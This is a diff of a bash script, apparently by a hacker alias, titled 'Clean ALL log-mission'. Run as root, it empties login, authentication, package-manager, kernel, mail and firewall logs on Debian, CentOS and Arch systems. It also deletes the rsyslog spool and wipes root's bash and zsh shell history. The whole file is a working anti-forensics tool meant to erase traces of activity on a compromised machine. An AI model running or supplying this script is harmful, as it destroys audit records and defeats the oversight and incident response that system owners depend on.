@@ -1,49 +1,214 @@
 #!/bin/bash
-# by C4ry_Anonymous create
-# Support Debian/Centos/Archlinux
-# Log query method: cat /etc/rsyslog.conf
+#by C4ry_Anonymous create
+#Support Debian/Centos/Archlinux
+#Log query method: cat /etc/rsyslog.conf
 #
-echo "# # # # # # # # # # # # # # # # "
+echo "# # # # # # # # # # # # # # # #"
 echo "################################"
 echo "#                              #"
-echo "#     Clean ALL log-mission    #"
-echo "#        C4ry_Anonymous        #"
+echo "#    Clean ALL log-mission     #"
+echo "#       C4ry_Anonymous         #"
 echo "#                              #"
 echo "################################"
-echo "# # # # # # # # # # # # # # # # "
-echo "Please enter ROOT to work"
+echo "# # # # # # # # # # # # # # # #"
+echo "!!!Please enter ROOT to work!!!"
 
-echo "# # # # # # # # # # "
-echo "# # # # # # # # "
-echo "# # # # # # "
-echo "# # # # "
-echo "# # "
+echo "# # # # # # # # # #"
+echo "# # # # # # # #"
+echo "# # # # # #"
+echo "# # # #"
+echo "# #"
+#---------------------------------------#
 echo "Clearing login information ..."
-cat /dev/null > /var/log/wtemp
-cat /dev/null > /var/log/btemp 2>/dev/null
-cat /dev/null > /var/log/lastlog 2>/dev/null
-cat /dev/null > /var/log/secure 2>/dev/null
+wtmp='/var/log/wtmp'
+btmp='/var/log/btmp'
+lastlog='/var/log/lastlog'
+secure='/var/log/secure'
+
+if [ -e $wtmp ] ; then
+   cat /dev/null > $wtmp 2>/dev/null && echo 'The [wtmp] is clear'
+ else
+   echo '#The [wtmp] not exist'
+fi
+
+if [ -e $btmp ] ; then
+   cat /dev/null > $btmp 2>/dev/null && echo 'The [btmp] is clear'
+ else
+   echo '#The [btmp] not exist'
+fi
+
+if [ -e $lastlog ] ; then
+   cat /dev/null > $lastlog 2>/dev/null && echo 'The [lastlog] is clear'
+ else
+   echo '#The [lastlog] not exist'
+fi
+
+if [ -e $secure ] ; then
+   cat /dev/null > $secure 2>/dev/null && echo 'The [secure] is clear'
+ else
+   echo '#The [secure] not exist'
+fi
+#---------------------------------------#
 echo "Clearing used information ..."
-cat /dev/null > /var/log/dpkg.log 2>/dev/null
-cat /dev/null > /var/log/faillog 2>/dev/null
-cat /dev/null > /var/log/fontconfig.log 2>/dev/null
-cat /dev/null > /var/log/alternatives.log 2>/dev/null
-cat /dev/null > /var/log/bootstrap.log 2>/dev/null
-cat /dev/null > /var/log/apt/history.log
+dpkglog='/var/log/dpkg.log'
+faillog='/var/log/faillog'
+fontconfiglog='/var/log/fontconfig.log'
+alternativeslog='/var/log/alternatives.log'
+bootstraplog='/var/log/bootstrap.log'
+aptlog='/var/log/apt/history.log'
+pacmanlog='/var/log/pacman.log'
+yumlog='/var/log/yum.log'
+
+if [ -e $dpkglog ] ; then
+   cat /dev/null > $dpkglog 2>/dev/null && echo 'The [dpkglog] is clear'
+ else
+   echo '#The [dpkglog] not exist'
+fi
+
+if [ -e $faillog ] ; then
+   cat /dev/null > $faillog 2>/dev/null && echo 'The [faillog] is clear'
+ else
+   echo '#The [faillog] not exist'
+fi
+
+if [ -e $fontconfiglog ] ; then
+   cat /dev/null > $fontconfiglog 2>/dev/null && echo 'The [fontconfiglog] is clear'
+ else
+   echo '#The [fontconfiglog] not exist'
+fi
+
+if [ -e $alternativeslog ] ; then
+   cat /dev/null > $alternativeslog 2>/dev/null && echo 'The [alternativeslog] is clear'
+ else
+   echo '#The [alternativeslog] not exist'
+fi
+
+if [ -e $bootstraplog ] ; then
+   cat /dev/null > $bootstraplog 2>/dev/null && echo 'The [bootstraplog] is clear'
+ else
+   echo '#The [bootstraplog] not exist'
+fi
+
+if [ -e $aptlog ] ; then
+   cat /dev/null > $aptlog 2>/dev/null && echo 'The [aptlog] is clear'
+ else
+   echo '#The [aptlog] not exist'
+fi
+
+if [ -e $pacmanlog ] ; then
+   cat /dev/null > $pacmanlog 2>/dev/null && echo 'The [pacmanlog] is clear'
+ else
+   echo '#The [pacmanlog] not exist'
+fi
+
+if [ -e $yumlog ] ; then
+   cat /dev/null > $yumlog 2>/dev/null && echo 'The [yumlog] is clear'
+ else
+   echo '#The [yumlog] not exist'
+fi
+#---------------------------------------#
 echo "Please wait for the program to complete ..."
-cat /dev/null > /var/log/apt/term.log 2>/dev/null
-cat /dev/null > /var/log/boot.log 2>/dev/null
-cat /dev/null > /var/log/auth.log 2>/dev/null
-cat /dev/null > /var/log/crog 2>/dev/null
-cat /dev/null > /var/log/dmesg 2>/dev/null
-cat /dev/null > /var/log/firewalld 2>/dev/null
-cat /dev/null > /var/log/mail.log 2>/dev/null
-cat /dev/null > /var/log/messages
-cat /dev/null > /var/log/sys.log 2>/dev/null
-cat /dev/null > /var/log/tally.log 2>/dev/null
-cat /dev/null > /var/log/yum.log 2>/dev/null
-cat /dev/null > /var/log/kern.log 2>/dev/null
-cat /dev/null > /var/log/user.log 2>/dev/null
-rm -r /var/spool/rsyslog/*
-history -c && history -w
-echo "It's done !!!"
+termlog='/var/log/apt/term.log'
+bootlog='/var/log/boot.log'
+authlog='/var/log/auth.log'
+croglog='/var/log/crog'
+dmesglog='/var/log/dmesg'
+firewalldlog='/var/log/firewalld'
+maillog='/var/log/mail.log'
+messageslog='/var/log/messages'
+syslog='/var/log/sys.log'
+tallylog='/var/log/tally.log'
+kernlog='/var/log/kern.log'
+userlog='/var/log/user.log'
+rsyslog='/var/spool/rsyslog/*'
+
+if [ -e $termlog ] ; then
+   cat /dev/null > $termlog 2>/dev/null && echo 'The [termlog] is clear'
+ else
+   echo '#The [termlog] not exist'
+fi
+
+if [ -e $bootlog ] ; then
+   cat /dev/null > $bootlog 2>/dev/null && echo 'The [bootlog] is clear'
+ else
+   echo '#The [bootlog] not exist'
+fi
+
+if [ -e $authlog ] ; then
+   cat /dev/null > $authlog 2>/dev/null && echo 'The [authlog] is clear'
+ else
+   echo '#The [authlog] not exist'
+fi
+
+if [ -e $croglog ] ; then
+   cat /dev/null > $croglog 2>/dev/null && echo 'The [croglog] is clear'
+ else
+   echo '#The [croglog] not exist'
+fi
+
+if [ -e $dmesglog ] ; then
+   cat /dev/null > $dmesglog 2>/dev/null && echo 'The [dmesglog] is clear'
+ else
+   echo '#The [dmesglog] not exist'
+fi
+
+if [ -e $firewalldlog ] ; then
+   cat /dev/null > $firewalldlog 2>/dev/null && echo 'The [firewalldlog] is clear'
+ else
+   echo '#The [firewalldlog] not exist'
+fi
+
+if [ -e $maillog ] ; then
+   cat /dev/null > $maillog 2>/dev/null && echo 'The [maillog] is clear'
+ else
+   echo '#The [maillog] not exist'
+fi
+
+if [ -e $messageslog ] ; then
+   cat /dev/null > $messageslog 2>/dev/null && echo 'The [messageslog] is clear'
+ else
+   echo '#The [messageslog] not exist'
+fi
+
+if [ -e $syslog ] ; then
+   cat /dev/null > $syslog 2>/dev/null && echo 'The [syslog] is clear'
+ else
+   echo '#The [syslog] not exist'
+fi
+
+if [ -e $tallylog ] ; then
+   cat /dev/null > $tallylog 2>/dev/null && echo 'The [tallylog] is clear'
+ else
+   echo '#The [tallylog] not exist'
+fi
+
+if [ -e $kernlog ] ; then
+   cat /dev/null > $kernlog 2>/dev/null && echo 'The [kernlog] is clear'
+ else
+   echo '#The [kernlog] not exist'
+fi
+
+if [ -e $userlog ] ; then
+   cat /dev/null > $userlog 2>/dev/null && echo 'The [userlog] is clear'
+ else
+   echo '#The [userlog] not exist'
+fi
+
+if [ -e $rsyslog ] ; then
+   rm -r /var/spool/rsyslog/* 2>/dev/null && echo 'The [rsyslog] is clear'
+ else
+   echo '#The [rsyslog] not exist'
+fi
+#---------------------------------------#
+echo "Please wait for clear SHELL to complete ..."
+if [ -e /root/.bash_history ] ; then
+   cat /dev/null > /root/.bash_history 2>/dev/null && echo 'The [bash-history] is clear'
+fi
+
+if [ -e /root/.zsh_history ] ; then
+   cat /dev/null > /root/.zsh_history 2>/dev/null && echo 'The [zsh-history] is clear'
+fi
+
+echo "It's done !! HOPE YOUR ENJOY !!"
+
+# a=`[ -e /etc/pacman.d/mirrorlist ] && echo 'The file exist'`
